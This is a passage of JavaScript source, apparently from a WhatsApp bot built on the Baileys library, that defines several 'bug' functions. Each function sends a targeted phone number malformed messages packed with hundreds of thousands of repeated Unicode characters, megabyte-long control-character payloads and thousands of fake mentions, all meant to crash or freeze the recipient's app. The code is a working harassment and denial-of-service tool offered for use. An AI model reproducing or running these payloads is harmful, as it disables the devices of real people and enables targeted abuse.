                    url: "https://wa.me/settings/channel/status" + "ꦽ".repeat(35000)
                  })
                },

                {
                  name: "multi_select",
                  buttonParamsJson: JSON.stringify({
                    title: "AxD Select",
                    sections: [
                      {
                        title: "AXD",
                        rows: [
                          {
                            id: "1",
                            title: "ꦽ".repeat(19999)
                          },
                          {
                            id: "2",
                            title: "ꦽ".repeat(19999)
                          }
                        ]
                      }
                    ]
                  })
                }

              ],
              messageParamsJson: "wa.me/stickerpack/whatsapp",
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  )

  await sock.relayMessage(
    target,
    msg.message,
    {
      messageId: msg.key.id
    }
  )
}
async function RxVzBurstV2(sock, target) {
    try {
        const delay = ms => new Promise(r => setTimeout(r, ms));

        const relay = async (payload) => {
            const msg = await generateWAMessageFromContent(target, payload, {
                userJid: sock.user.id
            });
            
            if (msg && msg.message) {
                await sock.relayMessage(target, msg.message, { 
                    messageId: msg.key?.id || sock.generateMessageTag() 
                });
            }
            await delay(100);
        };

        await relay({
            newsletterAdminInviteMessage: {
                newsletterJid: "120363200000000000@newsletter",
                newsletterName: "ꦾ" + "ꦽ".repeat(30000),
                caption: "𑜦𑜠".repeat(30000) + "ꦽ".repeat(30000)
            }
        });

        await relay({
            eventMessage: {
                isResource: true,
                name: "ꦾ" + "ꦽ".repeat(30000),
                description: "ꦾ" + "ꦽ".repeat(30000),
                location: {
                    degreesLatitude: -6.1751,
                    degreesLongitude: 106.8272,
                    name: "ꦾ" + "ꦽ".repeat(30000),
                },
                startTime: Math.floor(Date.now() / 1000) + 3600
            }
        });

        await relay({
            groupInviteMessage: {
                groupJid: "120363000000000000@g.us",
                inviteCode: "PukiMak",
                inviteExpiration: Math.floor(Date.now() / 1000) + 259200,
                groupName: "ꦾ".repeat(30000) + ":҉⃝҉".repeat(30000),
                caption: "ꦾ".repeat(30000) + "ꦽ".repeat(30000) + "𑇂𑆵𑆴𑆿".repeat(30000),
                jpegThumbnail: Buffer.alloc(0)
            }
        });

        await relay({
            newsletterAdminInviteMessage: {
                newsletterJid: "120363200000000000@newsletter",
                newsletterName: "ꦾ" + "ꦽ".repeat(30000),
                caption: "ꦾ".repeat(30000)
            }
        });

        await relay({
            listMessage: {
                title: "𑜦𑜠".repeat(20000),
                description: "ꦾ" + "ꦽ".repeat(30000),
                buttonText: "𑜦𑜠".repeat(20000),
                listType: 1,
                sections: Array.from({ length: 5 }, (_, i) => ({
                    title: `Cluster Node ${i}`,
                    rows: Array.from({ length: 10 }, (_, j) => ({
                        title: `Validation Row ${j}`,
                        description: `Sequence ID: ${i}-${j}-ALPHA-BETA`,
                        rowId: `id-${i}-${j}`
                    }))
                }))
            }
        });

        await relay({
            liveLocationMessage: {
                degreesLatitude: -6.1751,
                degreesLongitude: 106.8272,
                caption: "ꦾ".repeat(30000),
                sequenceNumber: "1",
                contextInfo: { forwardingScore: 999, isForwarded: true }
            }
        });

        await relay({
            newsletterAdminInviteMessage: {
                newsletterJid: "120363200000000000@newsletter",
                newsletterName: "ꦾ" + "ꦽ".repeat(30000),
                caption: "ꦾ".repeat(30000)
            }
        });

        await relay({
            pollCreationMessage: {
                name: "ꦾ".repeat(30000) + "ꦽ".repeat(30000),
                options: Array.from({ length: 12 }, (_, i) => ({ optionName: `Validation Node ${i}` })),
                selectableOptionsCount: 1
            }
        });

        await relay({
            interactiveMessage: {
                header: { title: "ꦾ" + "ꦽ".repeat(30000), hasMediaAttachment: false },
                body: { text: "ꦾ" + "ꦽ".repeat(30000) },
                footer: { text: "ꦾ" + "ꦽ".repeat(30000) },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "Mode Selection",
                                sections: [{
                                    title: "Available Modes",
                                    rows: [{ title: "Access", id: "1" }, { title: "Admin", id: "2" }]
                                }]
                            })
                        }
                    ]
                }
            }
        });

        await relay({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: "ꦾ".repeat(30000) + "ꦽ".repeat(30000) },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        icon: "DOCUMENT",
                                        flow_cta: "ꦽ".repeat(90000),
                                        flow_message_version: "3"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        });
        
        await relay({
            newsletterAdminInviteMessage: {
                newsletterJid: "120363200000000000@newsletter",
                newsletterName: "ꦾ" + "ꦽ".repeat(50000),
                caption: "ꦾ".repeat(30000)
            }
        });

        await sock.sendMessage(target, { text: "hallo kak" + "ꦽ".repeat(3000) });

    } catch (e) {
        console.error("Relay Error:", e);
    }
}
async function VnXDelayHard(sock, target, ptcp = true) {
  try {
    const generateMasifJids = (length) => Array.from({
        length
      }, () =>
      `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
    );

    const mentionedJidBase = ["0@s.whatsapp.net", ...generateMasifJids(1900)];
    const mentionedJidSuperMasif = generateMasifJids(1900 + 1950);
    const largeEmptyJson = "\u0000".repeat(1045000);
    const largeControlCharJson = "\x10".repeat(1045000);

    const VidMessage = generateWAMessageFromContent(target, {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileLength: "289511",
        seconds: 15,
        caption: "\n",
        height: 640,
        width: 640,
        contextInfo: {
          isSampled: true,
          participant: target,
          mentionedJid: mentionedJidBase,
          remoteJid: "X",
          forwardingScore: 100,
          isForwarded: true,
          quotedMessage: {
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            }
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true
    });
    
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: VidMessage.message
      },
    }, ptcp ? {
      messageId: VidMessage.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: VidMessage.key.id
    });

    const Msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Kenal MoroseWave Gak Bang??",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: largeEmptyJson,
              version: 3
            },
            contextInfo: {
              mentionedJid: mentionedJidBase
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg1.message
      },
    }, ptcp ? {
      messageId: Msg1.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg1.key.id
    });

    const Msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Njir lah Ada Danzvorever",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: largeEmptyJson,
              version: 3
            },
            entryPointConversionSource: "call_permission_request",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg2.message
      },
    }, ptcp ? {
      messageId: Msg2.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg2.key.id
    });

    const Msg3 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Kenal MoroseWave Gak Bang??",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: largeControlCharJson,
              version: 3
            },
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg3.message
      },
    }, ptcp ? {
      messageId: Msg3.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg3.key.id
    });

    const payload = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Njir lah delay bet",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: largeControlCharJson,
              version: 3
            },
            entryPointConversionSource: "call_permission_request"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: payload.message
      },
    }, ptcp ? {
      messageId: payload.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: payload.key.id
    });

    const payload2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\n",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: largeControlCharJson,
              version: 3,
            },
            entryPointConversionSource: "call_permission_message"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: payload2.message
      },
    }, ptcp ? {
      messageId: payload2.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: payload2.key.id
    });

    const Msg4 = generateWAMessageFromContent(target, {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/webp",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        contextInfo: {
          mentionedJid: mentionedJidBase,
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg4.message
      },
    }, ptcp ? {
      messageId: Msg4.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg4.key.id
    });

    const Msg5 = generateWAMessageFromContent(target, {
      extendedTextMessage: {
        text: "ꦾ".repeat(555555),
        contextInfo: {
          participant: target,
          mentionedJid: mentionedJidBase
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg5.message
      },
    }, ptcp ? {
      messageId: Msg5.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg5.key.id
    });

    const Msg6 = generateWAMessageFromContent(target, {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXr4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileLength: "1515940",
        seconds: 14,
        contextInfo: {
          isSampled: true,
          mentionedJid: [target]
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "MoroseWave Nich"
        },
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg6.message
      },
    }, ptcp ? {
      messageId: Msg6.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg6.key.id
    });

    const Msg7 = generateWAMessageFromContent(target, {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileLength: "389948",
        seconds: 24,
        caption: "Danzvorever Is Back",
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg7.message
      },
    }, ptcp ? {
      messageId: Msg7.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg7.key.id
    });

    const Msg8 = generateWAMessageFromContent(target, {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "Lu kenapa Dah??",
        fileLength: "19769",
        contextInfo: {
          mentionedJid: mentionedJidSuperMasif,
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: Msg8.message
      },
    }, ptcp ? {
      messageId: Msg8.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: Msg8.key.id
    });

    const ImgMessage = generateWAMessageFromContent(target, {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileLength: "289511",
        caption: "kasiann lu pasti delay ya???",
        contextInfo: {
          isSampled: true,
          mentionedJid: ["628123456789@s.whatsapp.net"]
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 2,
          newsletterName: "Salken Bang Gw Danzvorever"
        },
        annotations: [{
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "589608164114572",
              songId: "870166291800509",
              author: "Danzvorever",
              title: "This Is MoroseWave",
              artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
              artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
            }
          },
          embeddedAction: true
        }]
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 12000,
      isForwarded: true
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: ImgMessage.message
      },
    }, {
      messageId: ImgMessage.key.id
    });

    const MsgDocument = generateWAMessageFromContent(target, {
      documentMessage: {
        url: "https://www.google.com/",
        mimetype: "text/plain",
        title: "\u200b".repeat(90000),
        fileLength: "1",
        pageCount: 1,
        mediaKey: "A1B2C3D4E5F6G7H8",
        contextInfo: {
          mentionedJid: mentionedJidSuperMasif,
          forwardingScore: 100000,
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: MsgDocument.message
      },
    }, ptcp ? {
      messageId: MsgDocument.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: MsgDocument.key.id
    });

    const MsgContact = generateWAMessageFromContent(target, {
      contactMessage: {
        displayName: "MoroseWave",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${"~".repeat(100000)};;;\nFN:DANZVOREVER\nEND:VCARD`,
        contextInfo: {
          mentionedJid: mentionedJidBase,
          remoteJid: "status@broadcast",
          forwardingScore: 999999999,
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: MsgContact.message
      },
    }, ptcp ? {
      messageId: MsgContact.key.id,
      participant: {
        jid: target
      }
    } : {
      messageId: MsgContact.key.id
    });

    console.log(`sedang mengirim bug`, target);

  } catch (err) {
    console.log(`error saat mengirim bug`, target, err);
  }
}
async function RvXDelayui(sock, target) {
 let RVX = await generateWAMessageFromContent(
   target,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
              fileLength: "999999999999999",
              fileName: "ြ".repeat(150000),
              height: 999999,
              width: 999999,
              mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
              fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
              directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1755695348",
              jpegThumbnail: null
            }
          },
          body: {
            text: "RTX" + "ꦽ".repeat(120000)
          },
          footer: {
            text: "VNX" + "ြ".repeat(130000)
          },
          nativeFlowMessage: {
            nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"ⓘ ⸸VnX\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/channel/status\"}"
            }
          ]
            }
          }
        }
      }
      }
    }, 
  { userJid: target }
); 

  await sock.relayMessage(
    target,
      RVX.message,
    {
      participant: { jid: target },
      messageId: null
    }
  );
}
async function BlankStcXDelyBulldoVnX(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
             viewOnceMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                         newsletterJid: "120363321780343299@newsletter",
                         newsletterName: "Coba Kamu Pencet Chat Ini 🍁" + "ꦽꦾ".repeat(250000),
                         caption: "VnX Bng" + "ꦽꦾ".repeat(250000),
                         inviteExpiration: "9282682616283736",                      
                        }
                    }
                }
            },
            { participant: { jid: target } }
        ); 
        
        const sticker = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                  stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "⎋🩸⃟༑VnX Stiker༑" + "ꦾ".repeat(45000),
                    publisher: "ꦽ".repeat(25000),
                    stickers: [],
                    fileLength: 12260,
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
                     height: 9999,
                     width: 9999,
                     mediaKeyTimestamp: "1747502082",
                     isAnimated: false,
                     isAvatar: false,
                     isAiSticker: false,
                     isLottie: false,
                     emojis: ["🕸", "🕷", "🦠", "🌹"],
                    },
                },
            },
        }, {});

        const vnxmbg2 = generateWAMessageFromContent(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Makanan Enak Ya VnX",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            stanzaId:
            "666-666666-VnX-Id" +
            Math.floor(Math.random() * 99999),
        });
        
        await sock.relayMessage(target, {
            message: sticker.message,
        }, {
            messageId: sticker.key.id,
            participant: { jid: target },
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: vnxmbg2.message,
            },
        }, {
            messageId: vnxmbg2.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}
async function VnXCrashIos(sock, target) {
    let mbgiosvnx = await generateWAMessageFromContent(
        target,
        {
         contactMessage: {
            displayName:
        "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                contextInfo: {
                    stanzaId: "VnX",
                    mentionedJid: [target], 
                    isForwarded: true,
                    forwardingScore: 999,
                    
                    interactiveAnnotations: [{
                        polygonVertices: [
                            { x: 0.05625700578093529, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.8459166884422302 },
                            { x: 0.05625700578093529, y: 0.8459166884422302 }
                        ],
                        newsletter: {
                            newsletterJid: "120363186130999681@newsletter",
                            serverMessageId: 3033,
                            newsletterName: "sex null",
                            contentType: "UPDATE_CARD"
                        }
                    }]
                } 
            }
        },
        { userJid: sock.user.id, quoted: null }
    );

    await sock.relayMessage(
        "status@broadcast",
        mbgiosvnx.message,
        {
            messageId: mbgiosvnx.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

// Error handling
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

console.log('𝖡𝗈𝗍 𝖲𝗎𝖽𝖺𝗁 𝖡𝖾𝗋𝗃𝖺𝗅𝖺𝚗');
